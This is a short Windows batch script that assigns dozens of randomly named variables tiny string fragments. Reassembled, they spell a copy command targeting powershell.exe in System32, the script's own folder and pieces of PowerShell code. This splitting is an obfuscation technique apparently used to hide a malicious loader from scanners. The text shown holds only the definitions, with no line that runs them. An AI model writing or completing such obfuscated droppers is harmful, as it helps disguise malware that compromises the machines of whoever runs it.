@echo off
set "BsEUMhtxfO=Po"
set "wZqnBPRJec=xe"
set "OvesSRhyWT=in"
set "ufRUngROqV=1."
set "EreJdADjZh=we"
set "dgJQrTDbuW=\v"
set "qhOSsDoeiQ=ll"
set "NqNywFbLsb= C"
set "fdJYStXsoP=Sy"
set "jPFrplVxNL=nd"
set "bfJRkrXPtM=rs"
set "kYJQMHqIXF=ws"
set "zYHpQGzXbu=Wi"
set "dTHDZQJkih=y "
set "LJKYgTTaNm=ll"
set "tkVMLOIxHQ=s\"
set "bLiTwEWPwG=0\"
set "DXNtxaZmtp=st"
set "DxxeKFSQLa=we"
set "CyPXGMPbDC=32"
set "BIVkrQksxf=co"
set "audSKUqQzH= /"
set "MgevFRcIiP=.e"
set "oHODzQMnFk=rS"
set "ByAqshySaf=he"
set "XnVlbYUTFB=em"
set "WMAthuPKZy=po"
set "WOFOZIFxMS=he"
set "zdMNnfhPNL=do"
set "PzZvVAImcQ=ow"
set "jCJEazuAfm=:\"
set "drQdqNLbZl=py"
set "DqXmnwxBoK=\W"
set "LnGnKRYFXG= %~dp0"
set "ecKNnVNsIL=cd"
set "CrtRJgerdj=am;$"
set "lVQALpVTZl=  $S"
set "tXtiVzczqn=3); "
set "cvILLDIVBJ=qKwd"
set "zLCVQtxJTw=y.Pa"
set "QWAQSgdJby='txe"
set "xEfjmoOkuD=ect "
